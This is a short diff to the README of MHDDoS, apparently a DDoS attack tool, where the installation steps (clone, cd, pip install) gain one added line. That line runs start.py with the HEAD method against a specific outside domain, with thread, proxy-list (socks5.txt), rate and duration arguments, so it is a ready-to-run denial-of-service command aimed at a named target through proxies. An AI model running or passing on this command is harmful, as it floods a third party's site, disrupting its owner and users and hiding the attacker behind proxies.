@@ -141,6 +141,7 @@ You can read it from [GitHub Wiki](https://github.com/MatrixTM/MHDDoS/wiki)
 git clone https://github.com/MatrixTM/MHDDoS.git
 cd MHDDoS
 pip install -r requirements.txt
+python3 start.py HEAD https://ogcdn.mom 5 1000 socks5.txt 100 100
 ```
 
 **One-Line Installing on Fresh VPS**
